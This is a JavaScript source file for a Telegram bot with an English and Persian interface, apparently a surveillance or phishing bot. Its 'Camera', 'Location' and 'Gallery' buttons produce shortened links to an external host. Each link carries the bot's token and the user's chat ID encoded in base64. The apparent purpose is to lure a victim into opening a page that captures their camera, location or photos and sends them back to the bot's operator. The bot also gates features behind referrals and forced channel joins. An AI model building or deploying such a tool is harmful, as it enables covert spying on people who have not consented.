const { Telegraf } = require('telegraf');
const mongoose = require('mongoose');
const isgd = require('isgd');
const { Buffer } = require('buffer');

// Environment Variables
const MONGO_URI = process.env.MONGO_URI;
const OWNER_ID = process.env.OWNER_ID;

if (!MONGO_URI || !OWNER_ID) {
  console.error('Missing environment variables: MONGO_URI or OWNER_ID');
  process.exit(1);
}

// MongoDB Connection
mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('Connected to MongoDB'))
  .catch((err) => {
    console.error('MongoDB connection error:', err);
    process.exit(1);
  });

// MongoDB Schemas
const BotSchema = new mongoose.Schema({
  token: { type: String, required: true, unique: true },
  username: { type: String, required: true },
  creatorId: { type: String, required: true },
  createdAt: { type: Number, default: () => Math.floor(Date.now() / 1000) },
});

const BotUserSchema = new mongoose.Schema({
  botToken: { type: String, required: true },
  userId: { type: String, required: true },
  username: { type: String },
  hasJoined: { type: Boolean, default: false },
  isFirstStart: { type: Boolean, default: true },
  language: { type: String, default: 'en' },
  referredBy: { type: String, default: 'none' },
  referralCount: { type: Number, default: 0 },
  isVip: { type: Boolean, default: false },
  isBlocked: { type: Boolean, default: false },
  adminState: { type: String, default: 'none' },
  lastInteraction: { type: Number, default: () => Math.floor(Date.now() / 1000) },
});

const ChannelSchema = new mongoose.Schema({
  botToken: { type: String, required: true, unique: true },
  mainChannel: { type: String, default: 'https://t.me/Kali_Linux_BOTS' },
  customChannel: { type: String, default: null },
});

BotUserSchema.index({ botToken: 1, userId: 1 }, { unique: true });
const Bot = mongoose.model('Bot', BotSchema);
const BotUser = mongoose.model('BotUser', BotUserSchema);
const Channel = mongoose.model('Channel', ChannelSchema);

// Language Translations
const messages = {
  en: {
    selectLanguage: 'Please select your language:\nلطفا زبان مورد نظر خود را انتخاب کنید',
    langEnglish: 'English',
    langPersian: 'Persian (فارسی)',
    joinMessage: 'Please join our channel(s) to proceed:',
    joinMainChannel: 'Join Main Channel',
    joinCustomChannel: 'Join Custom Channel',
    joinedButton: 'I Have Joined',
    welcome: (username) => `Welcome, ${username}! Use the menu below to interact with the bot.`,
    menu: {
      camera: 'Camera',
      location: 'Location',
      gallery: 'Gallery',
      language: 'Language 🌐',
    },
    cameraMessage: (url) => `*Hi* how are you this is your Camera link\n${url}`,
    locationMessage: (url) => `*Hi* my dear best friends this is your location link\n${url}`,
    galleryLocked: (current, link) =>
      `*Hi* you have not enough invites to access it your total invite: ${current}\nyour invite link: ${link}`,
    galleryMessage: (url) => `*Hi* bei This is your gallery URL\n${url}`,
    banned: 'You are banned from using this bot.',
    adminPanel: 'Admin Panel',
    adminMenu: {
      stats: 'Statistics 📊',
      broadcast: 'Broadcast 📢',
      setChannel: 'Set Custom Channel 🔗',
      blockUser: 'Block User 🚫',
      unblockUser: 'Unblock User 🔓',
      back: 'Back to Menu ↩️',
    },
    statsMessage: (username, totalUsers, createdAt, mainChannel, customChannel) =>
      `Bot: @${username}\n` +
      `Total Users: ${totalUsers}\n` +
      `Created At: ${createdAt}\n` +
      `Main Channel: ${mainChannel}\n` +
      `Custom Channel: ${customChannel || 'Not set'}`,
    broadcastPrompt: (totalUsers) => `Send the message to broadcast to ${totalUsers} users (or type "Cancel"):`,
    broadcastSuccess: (success, failed) => `Broadcast completed! Sent to ${success} users, failed for ${failed}.`,
    broadcastCancel: 'Broadcast cancelled.',
    setChannelPrompt: 'Enter the custom channel URL (e.g., https://t.me/your_channel or @your_channel):',
    setChannelSuccess: (url) => `Custom channel set to: ${url}`,
    invalidChannel: 'Invalid channel URL. Please provide a valid Telegram channel link.',
    blockPrompt: 'Enter the user ID to block:',
    blockSuccess: (userId) => `User ${userId} has been blocked.`,
    unblockPrompt: 'Enter the user ID to unblock:',
    unblockSuccess: (userId) => `User ${userId} has been unblocked.`,
    userNotFound: 'User not found.',
    invalidUserId: 'Invalid user ID. Please enter a numeric ID.',
    cancel: 'Cancel',
    back: 'Back to Menu ↩️',
    error: 'An error occurred. Please try again.',
    newUserNotification: (username, userId, referredBy, totalUsers) =>
      `New User Joined!\n` +
      `Username: ${username}\n` +
      `User ID: ${userId}\n` +
      `Referred By: ${referredBy}\n` +
      `Total Users: ${totalUsers}`,
    referralNotification: (username, total) =>
      `🎉 ${username} joined using your link! Your total invites: ${total}`,
  },
  fa: {
    selectLanguage: 'لطفاً زبان خود را انتخاب کنید:\nPlease choose your language',
    langEnglish: 'انگلیسی',
    langPersian: 'فارسی',
    joinMessage: 'لطفاً برای ادامه به کانال(های) ما بپیوندید:',
    joinMainChannel: 'پیوستن به کانال اصلی',
    joinCustomChannel: 'پیوستن به کانال سفارشی',
    joinedButton: 'پیوستم',
    welcome: (username) => `خوش آمدید، ${username}! از منوی زیر استفاده کنید.`,
    menu: {
      camera: 'دوربین',
      location: 'موقعیت',
      gallery: 'گالری',
      language: 'زبان 🌐',
    },
    cameraMessage: (url) => `*سلام* چطور هستید این لینک دوربین شماست\n${url}`,
    locationMessage: (url) => `*سلام* دوستان عزیزم این لینک موقعیت شماست\n${url}`,
    galleryLocked: (current, link) =>
      `*سلام* شما دعوت کافی برای دسترسی ندارید، تعداد دعوت‌های شما: ${current}\nلینک دعوت شما: ${link}`,
    galleryMessage: (url) => `*سلام* بی این لینک گالری شماست\n${url}`,
    banned: 'شما از استفاده از این ربات محروم شده‌اید.',
    adminPanel: 'پنل مدیریت',
    adminMenu: {
      stats: 'آمار 📊',
      broadcast: 'پخش پیام 📢',
      setChannel: 'تنظیم کانال سفارشی 🔗',
      blockUser: 'مسدود کردن کاربر 🚫',
      unblockUser: 'رفع مسدودیت کاربر 🔓',
      back: 'بازگشت به منو ↩️',
    },
    statsMessage: (username, totalUsers, createdAt, mainChannel, customChannel) =>
      `ربات: @${username}\n` +
      `تعداد کاربران: ${totalUsers}\n` +
      `تاریخ ایجاد: ${createdAt}\n` +
      `کانال اصلی: ${mainChannel}\n` +
      `کانال سفارشی: ${customChannel || 'تنظیم نشده'}`,
    broadcastPrompt: (totalUsers) => `پیام را برای پخش به ${totalUsers} کاربر ارسال کنید (یا "لغو" را تایپ کنید):`,
    broadcastSuccess: (success, failed) => `پخش پیام انجام شد! به ${success} کاربر ارسال شد، برای ${failed} ناموفق بود.`,
    broadcastCancel: 'پخش پیام لغو شد.',
    setChannelPrompt: 'آدرس کانال سفارشی را وارد کنید (مثال: https://t.me/your_channel یا @your_channel):',
    setChannelSuccess: (url) => `کانال سفارشی تنظیم شد به: ${url}`,
    invalidChannel: 'آدرس کانال نامعتبر است. لطفاً یک لینک کانال تلگرام معتبر وارد کنید.',
    blockPrompt: 'شناسه کاربری را برای مسدود کردن وارد کنید:',
    blockSuccess: (userId) => `کاربر ${userId} مسدود شد.`,
    unblockPrompt: 'شناسه کاربری را برای رفع مسدودیت وارد کنید:',
    unblockSuccess: (userId) => `کاربر ${userId} رفع مسدودیت شد.`,
    userNotFound: 'کاربر یافت نشد.',
    invalidUserId: 'شناسه کاربری نامعتبر است. لطفاً یک شناسه عددی وارد کنید.',
    cancel: 'لغو',
    back: 'بازگشت به منو ↩️',
    error: 'خطایی رخ داد. لطفاً دوباره امتحان کنید.',
    newUserNotification: (username, userId, referredBy, totalUsers) =>
      `کاربر جدید پیوست!\n` +
      `نام کاربری: ${username}\n` +
      `شناسه کاربر: ${userId}\n` +
      `معرفی شده توسط: ${referredBy}\n` +
      `تعداد کل کاربران: ${totalUsers}`,
    referralNotification: (username, total) =>
      `🎉 ${username} با لینک شما پیوست! تعداد دعوت‌های شما: ${total}`,
  },
};

// Keyboards
const languageKeyboard = (lang) => ({
  reply_markup: {
    inline_keyboard: [
      [
        { text: messages[lang].langEnglish, callback_data: 'lang_en' },
        { text: messages[lang].langPersian, callback_data: 'lang_fa' },
      ],
    ],
  },
});

const joinKeyboard = (lang, mainChannel, customChannel) => {
  const keyboard = [
    [{ text: messages[lang].joinMainChannel, url: mainChannel }],
  ];
  if (customChannel) {
    keyboard.push([{ text: messages[lang].joinCustomChannel, url: customChannel }]);
  }
  keyboard.push([{ text: messages[lang].joinedButton, callback_data: 'joined' }]);
  return { reply_markup: { inline_keyboard: keyboard } };
};

const mainMenuKeyboard = (lang) => ({
  reply_markup: {
    keyboard: [
      [{ text: messages[lang].menu.camera }],
      [{ text: messages[lang].menu.location }],
      [{ text: messages[lang].menu.gallery }],
      [{ text: messages[lang].menu.language }],
    ],
    resize_keyboard: true,
  },
});

const adminMenuKeyboard = (lang) => ({
  reply_markup: {
    keyboard: [
      [
        { text: messages[lang].adminMenu.stats },
        { text: messages[lang].adminMenu.broadcast },
      ],
      [
        { text: messages[lang].adminMenu.setChannel },
        { text: messages[lang].adminMenu.blockUser },
      ],
      [
        { text: messages[lang].adminMenu.unblockUser },
        { text: messages[lang].adminMenu.back },
      ],
    ],
    resize_keyboard: true,
  },
});

const cancelKeyboard = (lang) => ({
  reply_markup: {
    keyboard: [
      [{ text: messages[lang].back }],
    ],
    resize_keyboard: true,
  },
});

// Helper Functions
const getFormattedDate = (timestamp) => {
  const date = new Date(timestamp * 1000);
  return `${date.getDate()}/${date.getMonth() + 1}/${date.getFullYear()}`;
};

const shortenUrl = async (longUrl) => {
  return new Promise((resolve) => {
    isgd.shorten(longUrl, (shortUrl, error) => {
      if (error) {
        console.error('Error shortening URL with is.gd:', error);
        resolve(longUrl);
      } else {
        resolve(shortUrl);
      }
    });
  });
};

const broadcastMessage = async (bot, message, users, senderId) => {
  let success = 0;
  let failed = 0;

  for (const user of users) {
    if (user.userId === senderId) continue;
    try {
      if (message.text) {
        await bot.telegram.sendMessage(user.userId, message.text);
      } else if (message.photo) {
        await bot.telegram.sendPhoto(user.userId, message.photo[message.photo.length - 1].file_id, {
          caption: message.caption || '',
        });
      }
      success++;
      await new Promise((resolve) => setTimeout(resolve, 50)); // Avoid rate limits
    } catch (error) {
      console.error(`Failed to broadcast to user ${user.userId}:`, error.message);
      failed++;
    }
  }

  return { success, failed };
};

// Main Handler
module.exports = async (req, res) => {
  try {
    if (req.method !== 'POST') {
      return res.status(200).send('Bot is running.');
    }

    const botToken = req.query.token;
    if (!botToken) {
      return res.status(400).json({ error: 'Bot token is required.' });
    }

    const botInfo = await Bot.findOne({ token: botToken });
    if (!botInfo) {
      return res.status(404).json({ error: 'Bot not found.' });
    }

    const bot = new Telegraf(botToken);
    const update = req.body;
    const chatId = update.message?.chat?.id || update.callback_query?.message?.chat?.id;
    const userId = (update.message?.from?.id || update.callback_query?.from?.id)?.toString();
    const messageId = update.message?.message_id || update.callback_query?.message?.message_id;

    if (!chatId || !userId) {
      return res.status(400).json({ error: 'Invalid update.' });
    }

    // Fetch or create user
    let user = await BotUser.findOne({ botToken, userId });
    if (!user) {
      const username = update.message?.from?.username
        ? `@${update.message.from.username}`
        : update.message.from.first_name || 'User';
      const referredBy = update.message?.text?.startsWith('/start') && update.message.text.includes(' ')
        ? update.message.text.split(' ')[1]
        : 'none';

      user = await BotUser.create({
        botToken,
        userId,
        username,
        hasJoined: false,
        isFirstStart: true,
        language: 'en',
        referredBy,
        referralCount: 0,
        isVip: false,
        isBlocked: false,
        adminState: 'none',
      });

      // Notify admin of new user
      const totalUsers = await BotUser.countDocuments({ botToken });
      const notification = messages['en'].newUserNotification(
        user.username,
        userId,
        user.referredBy,
        totalUsers
      );
      await bot.telegram.sendMessage(botInfo.creatorId, notification);

      // Notify referrer
      if (user.referredBy !== 'none' && /^\d+$/.test(user.referredBy)) {
        const referrer = await BotUser.findOne({ botToken, userId: user.referredBy });
        if (referrer) {
          referrer.referralCount = (referrer.referralCount || 0) + 1;
          await referrer.save();
          const referrerLang = referrer.language || 'en';
          const referralMessage = messages[referrerLang].referralNotification(user.username, referrer.referralCount);
          await bot.telegram.sendMessage(user.referredBy, referralMessage);
        }
      }
    }

    const lang = user.language || 'en';
    user.lastInteraction = Math.floor(Date.now() / 1000);
    await user.save();

    // Check if user is banned
    if (user.isBlocked && userId !== botInfo.creatorId && userId !== OWNER_ID) {
      await bot.telegram.sendMessage(chatId, messages[lang].banned);
      return res.status(200).json({ ok: true });
    }

    // Fetch channel info
    let channelInfo = await Channel.findOne({ botToken });
    if (!channelInfo) {
      channelInfo = await Channel.create({ botToken });
    }
    const mainChannel = channelInfo.mainChannel;
    const customChannel = channelInfo.customChannel;

    // Handle incoming messages
    if (update.message) {
      const text = update.message.text;

      if (text?.startsWith('/start')) {
        if (user.isFirstStart) {
          await bot.telegram.sendMessage(chatId, messages[lang].selectLanguage, languageKeyboard(lang));
          user.isFirstStart = false;
          await user.save();
        } else if (!user.hasJoined) {
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].joinMessage,
            joinKeyboard(lang, mainChannel, customChannel)
          );
        } else {
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].joinMessage,
            joinKeyboard(lang, mainChannel, customChannel)
          );
        }
      }

      else if (text === '/panel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        await bot.telegram.sendMessage(chatId, messages[lang].adminPanel, adminMenuKeyboard(lang));
        user.adminState = 'admin_panel';
        await user.save();
      }

      else if (user.adminState === 'admin_panel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].adminMenu.stats) {
          const totalUsers = await BotUser.countDocuments({ botToken });
          const createdAt = getFormattedDate(botInfo.createdAt);
          const stats = messages[lang].statsMessage(
            botInfo.username,
            totalUsers,
            createdAt,
            mainChannel,
            customChannel
          );
          await bot.telegram.sendMessage(chatId, stats, adminMenuKeyboard(lang));
        }

        else if (text === messages[lang].adminMenu.broadcast) {
          const totalUsers = await BotUser.countDocuments({ botToken, hasJoined: true });
          if (totalUsers === 0) {
            await bot.telegram.sendMessage(chatId, 'No users to broadcast to.', adminMenuKeyboard(lang));
          } else {
            await bot.telegram.sendMessage(
              chatId,
              messages[lang].broadcastPrompt(totalUsers),
              cancelKeyboard(lang)
            );
            user.adminState = 'awaiting_broadcast';
            await user.save();
          }
        }

        else if (text === messages[lang].adminMenu.setChannel) {
          await bot.telegram.sendMessage(chatId, messages[lang].setChannelPrompt, cancelKeyboard(lang));
          user.adminState = 'awaiting_channel';
          await user.save();
        }

        else if (text === messages[lang].adminMenu.blockUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].blockPrompt, cancelKeyboard(lang));
          user.adminState = 'awaiting_block';
          await user.save();
        }

        else if (text === messages[lang].adminMenu.unblockUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].unblockPrompt, cancelKeyboard(lang));
          user.adminState = 'awaiting_unblock';
          await user.save();
        }

        else if (text === messages[lang].adminMenu.back) {
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].welcome(user.username),
            mainMenuKeyboard(lang)
          );
          user.adminState = 'none';
          await user.save();
        }
      }

      else if (user.adminState === 'awaiting_broadcast' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, messages[lang].broadcastCancel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUsers = await BotUser.find({ botToken, hasJoined: true, isBlocked: false });
        const { success, failed } = await broadcastMessage(bot, update.message, targetUsers, userId);
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].broadcastSuccess(success, failed),
          adminMenuKeyboard(lang)
        );
        user.adminState = 'admin_panel';
        await user.save();
      }

      else if (user.adminState === 'awaiting_channel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, 'Cancelled.', adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        let channelUrl = text.trim();
        if (!channelUrl.startsWith('https://t.me/') && !channelUrl.startsWith('@')) {
          await bot.telegram.sendMessage(chatId, messages[lang].invalidChannel, cancelKeyboard(lang));
          return;
        }
        if (channelUrl.startsWith('@')) {
          channelUrl = `https://t.me/${channelUrl.replace('@', '')}`;
        }

        await Channel.findOneAndUpdate({ botToken }, { customChannel: channelUrl }, { upsert: true });
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].setChannelSuccess(channelUrl),
          adminMenuKeyboard(lang)
        );
        user.adminState = 'admin_panel';
        await user.save();
      }

      else if (user.adminState === 'awaiting_block' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, 'Cancelled.', adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        if (!/^\d+$/.test(text)) {
          await bot.telegram.sendMessage(chatId, messages[lang].invalidUserId, cancelKeyboard(lang));
          return;
        }

        const targetUser = await BotUser.findOne({ botToken, userId: text });
        if (!targetUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].userNotFound, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        targetUser.isBlocked = true;
        await targetUser.save();
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].blockSuccess(text),
          adminMenuKeyboard(lang)
        );
        user.adminState = 'admin_panel';
        await user.save();
      }

      else if (user.adminState === 'awaiting_unblock' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, 'Cancelled.', adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        if (!/^\d+$/.test(text)) {
          await bot.telegram.sendMessage(chatId, messages[lang].invalidUserId, cancelKeyboard(lang));
          return;
        }

        const targetUser = await BotUser.findOne({ botToken, userId: text });
        if (!targetUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].userNotFound, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        targetUser.isBlocked = false;
        await targetUser.save();
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].unblockSuccess(text),
          adminMenuKeyboard(lang)
        );
        user.adminState = 'admin_panel';
        await user.save();
      }

      else if (text === messages[lang].menu.camera) {
        try {
          const encodedBot = Buffer.from(botToken).toString('base64');
          const encodedId = Buffer.from(chatId.toString()).toString('base64');
          const longUrl = `https://for-free.serv00.net/t/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl);
          await bot.telegram.sendPhoto(
            chatId,
            'https://i.ibb.co/MM1w5VJ/775a542a8c19.jpg',
            {
              caption: messages[lang].cameraMessage(shortUrl),
              parse_mode: 'Markdown',
              reply_markup: mainMenuKeyboard(lang),
            }
          );
        } catch (error) {
          console.error('Error in Camera button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error);
        }
      }

      else if (text === messages[lang].menu.location) {
        try {
          const encodedBot = Buffer.from(botToken).toString('base64');
          const encodedId = Buffer.from(chatId.toString()).toString('base64');
          const longUrl = `https://for-free.serv00.net/2/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl);
          await bot.telegram.sendPhoto(
            chatId,
            'https://mallucampaign.in/images/img_1709042709.jpg',
            {
              caption: messages[lang].locationMessage(shortUrl),
              parse_mode: 'Markdown',
              reply_markup: mainMenuKeyboard(lang),
            }
          );
        } catch (error) {
          console.error('Error in Location button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error);
        }
      }

      else if (text === messages[lang].menu.gallery) {
        try {
          const requiredReferrals = 3;
          const userReferrals = user.referralCount || 0;
          if (user.isVip || userReferrals >= requiredReferrals) {
            const encodedBot = Buffer.from(botToken).toString('base64');
            const encodedId = Buffer.from(chatId.toString()).toString('base64');
            const longUrl = `https://for-free.serv00.net/helps/index.html?x=${encodedBot}&y=${encodedId}`;
            const shortUrl = await shortenUrl(longUrl);
            await bot.telegram.sendPhoto(
              chatId,
              'https://i.ibb.co/MM1w5VJ/775a542a8c19.jpg',
              {
                caption: messages[lang].galleryMessage(shortUrl),
                parse_mode: 'Markdown',
                reply_markup: mainMenuKeyboard(lang),
              }
            );
          } else {
            const botLink = `https://t.me/${botInfo.username}?start=${userId}`;
            await bot.telegram.sendPhoto(
              chatId,
              'https://i.ibb.co/MM1w5VJ/775a542a8c19.jpg',
              {
                caption: messages[lang].galleryLocked(userReferrals, botLink),
                parse_mode: 'Markdown',
                reply_markup: mainMenuKeyboard(lang),
              }
            );
          }
        } catch (error) {
          console.error('Error in Gallery button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error);
        }
      }

      else if (text === messages[lang].menu.language) {
        await bot.telegram.sendMessage(chatId, messages[lang].selectLanguage, {
          reply_markup: {
            inline_keyboard: [
              [
                { text: messages[lang].langEnglish, callback_data: 'lang_en_menu' },
                { text: messages[lang].langPersian, callback_data: 'lang_fa_menu' },
              ],
            ],
          },
        });
      }
    }

    // Handle callback queries
    if (update.callback_query) {
      const callbackData = update.callback_query.data;
      const callbackQueryId = update.callback_query.id;

      if (callbackData === 'lang_en') {
        user.language = 'en';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'Language set to English');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages['en'].joinMessage,
          joinKeyboard('en', mainChannel, customChannel)
        );
      }

      else if (callbackData === 'lang_fa') {
        user.language = 'fa';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'زبان به فارسی تنظیم شد');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages['fa'].joinMessage,
          joinKeyboard('fa', mainChannel, customChannel)
        );
      }

      else if (callbackData === 'lang_en_menu') {
        user.language = 'en';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'Language set to English');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages['en'].welcome(user.username),
          mainMenuKeyboard('en')
        );
      }

      else if (callbackData === 'lang_fa_menu') {
        user.language = 'fa';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'زبان به فارسی تنظیم شد');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages['fa'].welcome(user.username),
          mainMenuKeyboard('fa')
        );
      }

      else if (callbackData === 'joined') {
        user.hasJoined = true;
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'Thank you for joining!');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].welcome(user.username),
          mainMenuKeyboard(lang)
        );
      }
    }

    return res.status(200).json({ ok: true });
  } catch (error) {
    console.error('Error in bot:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
};